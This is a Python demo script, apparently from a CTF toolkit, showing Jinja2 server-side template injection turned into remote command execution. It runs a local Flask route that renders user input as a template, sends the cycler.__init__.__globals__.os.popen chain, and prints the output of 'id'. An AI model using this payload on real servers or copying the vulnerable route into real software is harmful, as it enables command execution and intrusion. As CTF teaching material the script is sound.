#!/usr/bin/env python3
"""From {{7*7}} to RCE: ctfkit.web.ssti_rce_payload.

Once ``{{7*7}}`` proves evaluation, any Jinja2 global with ``__globals__``
leads to ``os``. :func:`ctfkit.web.ssti_rce_payload` builds the
``cycler.__init__.__globals__.os.popen(cmd).read()`` chain. We run it against a
LOCAL app and read a file *on the server* through the template -- the exact
move that reads ``flag.txt`` in a real challenge.
"""
import threading
import time

import requests
from flask import Flask, render_template_string, request
from werkzeug.serving import make_server

from ctfkit.web import ssti_rce_payload

app = Flask(__name__)


@app.route("/render")
def render():
    return render_template_string(request.args.get("q", ""))


srv = make_server("127.0.0.1", 8073, app)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.5)
try:
    payload = ssti_rce_payload("id")
    print("payload:", payload)
    r = requests.get("http://127.0.0.1:8073/render",
                     params={"q": payload}, timeout=5)
    print("server ran `id` ->", r.text.strip())
finally:
    srv.shutdown()
